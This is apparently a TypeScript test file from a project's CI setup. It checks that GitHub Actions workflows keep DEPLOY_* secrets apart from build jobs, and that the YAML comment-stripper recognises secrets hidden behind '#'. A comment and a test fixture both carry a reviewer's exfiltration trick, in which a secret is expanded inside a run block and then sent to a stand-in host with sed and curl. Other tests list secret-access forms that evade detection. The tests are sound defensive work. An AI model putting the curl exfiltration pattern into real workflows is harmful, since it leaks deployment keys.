  const calledFile = producer.uses.replace(/^\.\/\.github\/workflows\//, "");
  const called = read(calledFile);
  const inner = called.match(/^\s+sha:\s*\n(?:\s+description:[^\n]*\n)?\s+value: \$\{\{ jobs\.([A-Za-z0-9_-]+)\.outputs\.sha \}\}$/m);
  assert.ok(inner, `${calledFile} の outputs.sha が `.concat("`jobs.<id>.outputs.sha` の形で書かれていない"));
  const innerJob = jobsOfText(called, calledFile).find((j) => j.name === inner[1]);
  assert.ok(innerJob, `${calledFile} に job \`${inner[1]}\` が無い`);
  assert.match(
    innerJob.body,
    /^\s+sha: \$\{\{ steps\.([A-Za-z0-9_-]+)\.outputs\.sha \}\}$/m,
    `${calledFile} の job \`${inner[1]}\` が outputs.sha を step の出力に束ねていない（空文字に解決され、release.yml の released タグが動かない）`,
  );
  assert.match(read("release.yml"), /needs\.production\.outputs\.sha/);
});

test("#1137 呼び出し元 3 つから見た inputs の契約が変わっていない", () => {
  const src = read("deploy-site.yml");
  const declared = [...src.matchAll(/^ {6}([a-z_]+):\s*$/gm)].map((m) => m[1]);
  for (const k of ["environment", "site_origin", "target_dir", "ref", "data_ref"]) {
    assert.ok(declared.includes(k), `inputs.${k} が消えた（呼び出し元が渡す名前）`);
  }
  // **コメントを落としてから `uses:` を見る。** 生文字列の `includes` だと、`etl.yml` /
  // `districts.yml` / `local-assemblies.yml` の #308 のコメント（deploy-vps の説明で
  // deploy-site.yml に言及）が呼び出し元として数えられる（実測: 3 → 6 件）。
  const callers = workflowFiles()
    .filter((f) => f !== "deploy-site.yml")
    .filter((f) =>
      uncommented(read(f))
        .split("\n")
        .some((l) => /^\s*uses:\s*\.\/\.github\/workflows\/deploy-site\.yml\s*$/.test(l)),
    );
  assert.deepEqual(callers, ["deploy-data.yml", "deploy-staging.yml", "release.yml"], "呼び出し元の集合が変わった");
  for (const f of callers) {
    for (const j of jobsOfText(read(f), f)) {
      if (!j.uses?.includes("deploy-site.yml")) continue;
      const withAt = j.body.indexOf("with:");
      assert.ok(withAt >= 0, `${id(j)} に with: が無い`);
      const after = j.body.slice(withAt);
      const stopAt = after.search(/^\s{4}secrets:/m);
      const withBlock = stopAt < 0 ? after : after.slice(0, stopAt);
      const keys = [...withBlock.matchAll(/^\s{6}([a-z_]+):/gm)].map((m) => m[1]);
      assert.ok(keys.length > 0, `${id(j)} の with: からキーが読めない`);
      for (const k of keys) assert.ok(declared.includes(k), `${id(j)} が渡す \`${k}\` は deploy-site.yml の inputs に無い`);
    }
  }
});

test("#1137 deploy-site.yml が宣言する secrets は DEPLOY_* 4 件だけ（呼び出し元がそれ以上渡せない）", () => {
  const src = uncommented(read("deploy-site.yml"));
  const block = src.slice(src.indexOf("\n    secrets:"));
  const declared = [...block.matchAll(/^ {6}([A-Z_]+):\s*$/gm)].map((m) => m[1]).sort();
  assert.deepEqual(declared, ["DEPLOY_HOST", "DEPLOY_KNOWN_HOSTS", "DEPLOY_SSH_KEY", "DEPLOY_USER"]);
  // 呼び出し元が渡すキーも同じ 4 件であること
  for (const f of ["deploy-staging.yml", "release.yml", "deploy-data.yml"]) {
    const passed = [...uncommented(read(f)).matchAll(/^ {6}(DEPLOY_[A-Z_]+):/gm)].map((m) => m[1]);
    assert.ok(passed.length > 0, `${f} が DEPLOY_* を 1 つも渡していない`);
    for (const k of passed) assert.ok(declared.includes(k), `${f} が渡す \`${k}\` は deploy-site.yml が宣言していない`);
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// 検査そのものの検査（allowlist が本当に「語」を拾っていることを合成 YAML で確かめる）
// ─────────────────────────────────────────────────────────────────────────────

test("#1137 検査の検査: secretLines は 5 つの形すべてを拾う（denylist ではない）", () => {
  // **前身の denylist（`secrets\.(DEPLOY_[A-Z_]+)`）が素通しした形を全部並べる。**
  const forms = [
    "          KEY: ${{ secrets.DEPLOY_SSH_KEY }}", // 元の 1 形（denylist が唯一拾えた形）
    "          ALL: ${{ toJSON(secrets) }}", // MX1（レビュアーの変異。すり抜けていた）
    "          KEY: ${{ secrets['DEPLOY_SSH_KEY'] }}", // MX2（同上）
    '          KEY: ${{ secrets["DEPLOY_SSH_KEY"] }}',
    "          KEY: ${{ secrets.SOMETHING_ELSE }}", // 綴りを列挙しないので、これも拾う
    "    secrets: inherit", // 宣言・受け渡しの形
  ];
  for (const l of forms) {
    assert.deepEqual(secretLines(l), [l.trim()], `この形を拾えていない: ${l.trim()}`);
  }
  // 行頭コメントは拾わない（偽陽性で本物の分割を落とさない）
  assert.deepEqual(secretLines(uncommented("      # note: secrets used to be here (#1137)")), []);
});

test("#1137 検査の検査: ビルドと secrets が同じファイルに在る形を合成すると (A) が検出する", () => {
  const yaml = [
    "jobs:",
    "  fused:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: pnpm build",
    "      - run: echo x",
    "        env:",
    "          ALL: ${{ toJSON(secrets) }}",
    "",
  ].join("\n");
  const [j] = jobsOfText(yaml, "probe.yml");
  assert.ok(buildsCode(j.body), "合成した job のビルドを検出できていない");
  assert.equal(secretLines(j.body).length, 1, "合成した job の secrets を検出できていない");
});

test("#1137 検査の検査: 行頭コメントに `pnpm build` と書いただけでは buildsCode にならない（#570 の罠）", () => {
  const yaml = [
    "jobs:",
    "  d:",
    "    runs-on: ubuntu-latest",
    "    # note: pnpm build used to happen here (#1137)",
    "    steps:",
    "      - run: rsync -az x/ y/",
    "",
  ].join("\n");
  const [j] = jobsOfText(yaml, "probe.yml");
  assert.ok(!buildsCode(j.body), "コメントの `pnpm build` を実体と取り違えている（偽陽性で本物の分割を落とす）");
});

test("#1137 検査の検査: `pnpm run build` / `pnpm --filter web build` / `npm ci` も拾う", () => {
  for (const cmd of ["pnpm run build", "pnpm --filter web build", "npm ci", "yarn install --frozen-lockfile"]) {
    const yaml = ["jobs:", "  x:", "    runs-on: ubuntu-latest", "    steps:", `      - run: ${cmd}`, ""].join("\n");
    const [j] = jobsOfText(yaml, "probe.yml");
    assert.ok(buildsCode(j.body), `\`${cmd}\` をビルドとして拾えていない（この形で鍵と同居できてしまう）`);
  }
});

test("#1137 検査の検査: uses: の値を読めている（別 workflow への鎖を辿る足場）", () => {
  const yaml = [
    "jobs:",
    "  b:",
    "    uses: ./.github/workflows/build-site.yml",
    "    with:",
    "      ref: main",
    "",
  ].join("\n");
  const [j] = jobsOfText(yaml, "probe.yml");
  assert.equal(j.uses, "./.github/workflows/build-site.yml");
  assert.deepEqual(secretLines(j.body), [], "secrets を渡していない呼び出しを誤検出している");
});

// ─────────────────────────────────────────────────────────────────────────────
// #1137 レビュー指摘: **コメント落としが `run:` ブロックとクォートの中の `#` を
// 本物のコメントと取り違えていた。** YAML/GitHub ではその 2 か所で `#` はコメントにならず、
// `${{ secrets.X }}` が展開される。
//
// **レビュアーの実効攻撃（変異 N22。当時 0/21 で全部緑・actionlint も exit 0）:**
//
//     - run: |
//         #${{ secrets.DEPLOY_SSH_KEY }}
//         sed -n '2p' "$0" | curl -sX POST --data-binary @- https://example.invalid/c
//
// GitHub が 2 行目に鍵を展開して**スクリプトのファイルに書き**、shell にはコメントなので
// 怪しいコマンドが 1 つも無い。`sed` が自分自身を読み返して送り出す。
// **検査は `#` 以降を捨てていたので `secrets` を見なかった。**
//
// ── 正しい規則（ここで固定する）────────────────────────────────────────
// YAML でコメントになる `#` は、**次の 3 つを全部満たす場合だけ**である:
//   (1) **ブロックスカラー（`|` / `>`）の中ではない。** 中身は逐語のテキストで、`#` は文字である。
//   (2) **行頭（インデントの直後）に在るか、直前が空白である。** `a#b` の `#` は語の一部。
//   (3) **クォート（`'` / `"`）の中ではない。**
//
// ── 偽陽性を増やさないことも同時に固定する（レビュアーが測って「正しい挙動」と明記）──
//   `KEY: ${{ env.X }} # ${{ secrets.X }}`（クォート無しの行末コメント）は **緑のまま**
//   `build-site.yml` の docblock が `secrets` を 18 回書いて **緑のまま**
// **「コメント落としを全部やめる」のは誤りである。** 上の 2 つが赤くなる。
// ─────────────────────────────────────────────────────────────────────────────

/**
 * ── 同型の `#` 落としは他にも在るが、今回は触らない（**数えてから言う**。#757）──
 * `indexOf("#")` という同じ形は `packages/etl/test/` に **10 本**在る
 * （`branch-protection-jobs` / `workflow-{scrum-monitor,data-pr-push,released-chain,
 * pr-body-edited,needs-resolve,deploy-data-push,timeout,deploy-split,deploy-concurrency}`）。
 * **そのうち鍵の漏洩を見ているのはこの 1 本だけである。**
 * 残り 9 本で `secrets` という語が出るのは 4 本・合計 20 行で、**内訳は
 * 逐語の job 名 `issue-secrets` が 17 行、コメントの地の文が 3 行**
 * （`workflow-timeout.test.ts:21` の「許されるキー」の引用に含まれる `"secrets"` を含む）。
 * **どれも「どの job が鍵を読めるか」を判定していない**ので、`#` の取り違えが
 * 鍵の経路を見逃すことに繋がらない。**だから今回の範囲はこの 1 本に限る。**
 */

/** 合成する YAML の行のインデント（`env:` の下の深さ） */
const FENCE = "          ";

test("#1137 レビュー: `run:` ブロックの中の行頭 `#` はコメントではない（変異 N22 の経路）", () => {
  // **GitHub はここに鍵を展開する。** shell のコメントなので実行はされないが、
  // **スクリプトのファイルの中には書かれる**ので、同じスクリプトが自分を読めば持ち出せる。
  const yaml = [
    "jobs:",
    "  x:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: |",
    "          #${{ secrets.DEPLOY_SSH_KEY }}",
    "          sed -n '2p' \"$0\" | curl -sX POST --data-binary @- https://example.invalid/c",
    "",
  ].join("\n");
  assert.deepEqual(
    secretLines(uncommented(yaml)),
    ["#${{ secrets.DEPLOY_SSH_KEY }}"],
    "`run: |` の中の行頭 `#` を YAML のコメントと取り違えている（**鍵はここに展開される**）",
  );
  // job 本文の経路（jobsOfText → body）でも同じこと
  const [j] = jobsOfText(yaml, "probe.yml");
  assert.equal(secretLines(j.body).length, 1, "job 本文の側でも取り違えている");
});

test("#1137 レビュー: `run: |` の中の空白付き `#` もコメントではない", () => {
  const yaml = [
    "jobs:",
    "  x:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: |",
    "          echo hi  # ${{ secrets.DEPLOY_SSH_KEY }}",
    "",
  ].join("\n");
  assert.equal(secretLines(uncommented(yaml)).length, 1, "ブロックスカラーの中では `#` は常に文字である");
});

test("#1137 レビュー: クォートの中の `#` はコメントではない", () => {
  for (const l of [
    `${FENCE}KEY: "# ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}"`,
    `${FENCE}KEY: '# ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}'`,
    // **クォート追跡が実際に効くのはこの形である。**
    // 上の 2 つは `#` の直前が `"` / `'` なので、規則 (1)（直前が空白）だけで守られる。
    // **`#` の直前が空白で、かつクォートの中**のときに初めて (2) が要る
    // ——これに気づかず上の 2 つだけを並べていたら、**クォート追跡を潰す変異（I2）が
    // 27/27 緑で素通りした。実装ではなく fixture が弱かった。**
    `${FENCE}KEY: "x # ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}"`,
    `${FENCE}KEY: 'x # ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}'`,
  ]) {
    assert.equal(secretLines(uncommented(l)).length, 1, `クォート内の \`#\` をコメントと取り違えている: ${l.trim()}`);
  }
});

test("#1137 レビュー: 語の中の `#` はコメントではない（ブロックスカラーの外でも）", () => {
  // **ブロックスカラーの外**でも、`#` の直前が空白でなければコメントではない。
  // これを塞がないと `commentStart` を `indexOf("#")` に戻す変異（I1）が素通りする
  // （下の `${pair#*=}` の検査は `run: |` の中なので、ブロック認識だけで守られていた）。
  const l = `${FENCE}KEY: tag#${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}`;
  assert.equal(secretLines(uncommented(l)).length, 1, `語の中の \`#\` をコメントと取り違えている: ${l.trim()}`);
  // **向きを両方固定する。** 同じ行の中に語中 `#` と本物の行末コメントが在るとき、
  // 残るのは語中 `#` までで、コメント側の `secrets` は落ちること。
  assert.equal(
    uncommented(`${FENCE}KEY: tag#v1 # ${"${{"} secrets.X ${"}}"}`).trim(),
    "KEY: tag#v1",
    "語中 `#` を残しつつ、空白のあとの本物のコメントを落とせていない",
  );
  assert.deepEqual(secretLines(uncommented(`${FENCE}KEY: tag#v1 # ${"${{"} secrets.X ${"}}"}`)), []);
});

test("#1137 レビュー: ブロックスカラーは、同じ深さの行に戻った時点で閉じる", () => {
  // **ブロックが閉じないと、その後ろの本物のコメントまで残って偽陽性になる。**
  // `>` を `>=` に変える変異（I7）は検査を**強くする**向きなので「鍵が漏れる」側ではないが、
  // 偽陽性は本物の分割を落とすので、境界をここで固定する。
  const yaml = [
    "jobs:",
    "  x:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - run: |",
    "          echo a",
    `      - name: next # ${"${{"} secrets.X ${"}}"}`, // 導入行と同じ深さ = ブロックの外 = 本物のコメント
    "",
  ].join("\n");
  assert.deepEqual(
    secretLines(uncommented(yaml)),
    [],
    "ブロックスカラーが同じ深さの行で閉じていない（後続の本物のコメントまで残り、偽陽性になる）",
  );
  // 逆向き: ブロックの**中**（より深い）は残ること（この検査が空回りしていない証拠）
  const inside = yaml.replace("          echo a", `          echo a # ${"${{"} secrets.X ${"}}"}`);
  assert.equal(secretLines(uncommented(inside)).length, 1, "ブロックの中身を落としている");
});

test("#1137 レビュー: 本物の行末コメントは落ちたままである（偽陽性を増やさない）", () => {
  // **レビュアーが測って「緑のままなのが正しい挙動」と明記した形。**
  const l = `${FENCE}KEY: ${"${{"} env.X ${"}}"} # ${"${{"} secrets.X ${"}}"}`;
  assert.deepEqual(secretLines(uncommented(l)), [], `本物の行末コメントが落ちていない（偽陽性）: ${l.trim()}`);
  // 行頭コメント（ブロックスカラーの外）も落ちたまま
  assert.deepEqual(secretLines(uncommented("      # note: secrets used to be here (#1137)")), []);
  // `build-site.yml` の docblock は `secrets` を何度も正当に書く。**緑のまま**であること。
  const doc = read("build-site.yml");
  const rawDocHits = doc.split("\n").filter((l) => /^\s*#/.test(l) && /\bsecrets\b/i.test(l)).length;
  assert.ok(rawDocHits >= 15, `build-site.yml の docblock が \`secrets\` を ${rawDocHits} 行しか書いていない（実測 2026-10-04: 18 行）。この検査が空回りしている`);
  assert.deepEqual(secretLines(uncommented(doc)), [], "build-site.yml の docblock が偽陽性になった");
});

test("#1137 レビュー: `${pair#*=}` / `PR_CELL=\"#$PR\"` を途中で切らない（語の中の `#`）", () => {
  // **実在する形**（`etl.yml` / `local-assemblies.yml` の `run:` ブロック）。
  // 前の実装はここで行を切っていた（`echo "` だけが残っていた）。
  for (const [raw, must] of [
    ['          echo "### $name (${pair#*=})" | tee -a etl.log', "pair#*=" ],
    ['          if [ -n "$PR" ]; then PR_CELL="#$PR"; else PR_CELL="なし"; fi', "PR_CELL" ],
  ] as const) {
    const yaml = ["jobs:", "  x:", "    runs-on: ubuntu-latest", "    steps:", "      - run: |", raw, ""].join("\n");
    assert.match(uncommented(yaml), new RegExp(must.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), `\`${must}\` が切り落とされている: ${raw.trim()}`);
  }
  // 実ファイルでも確かめる（母数つき。#757）
  const hashInRun = ["etl.yml", "local-assemblies.yml"]
    .flatMap((f) => uncommented(read(f)).split("\n"))
    .filter((l) => /\$\{[A-Za-z_][A-Za-z0-9_]*#/.test(l) || /PR_CELL="#/.test(l)).length;
  assert.ok(hashInRun >= 4, `\`run:\` の中の語中 \`#\` が ${hashInRun} 行しか残っていない（実測 2026-10-04: 5 行）`);
});

test("#1137 レビュー: `secrets` の照合は大文字小文字を区別しない（`SECRETS.` が素通りしていた）", () => {
  const l = `${FENCE}KEY: ${"${{"} SECRETS.DEPLOY_SSH_KEY ${"}}"}`;
  assert.deepEqual(secretLines(l), [l.trim()], "大文字 `SECRETS.` を拾えていない");
  assert.equal(secretLines(`${FENCE}ALL: ${"${{"} toJSON(Secrets) ${"}}"}`).length, 1, "`toJSON(Secrets)` を拾えていない");
});
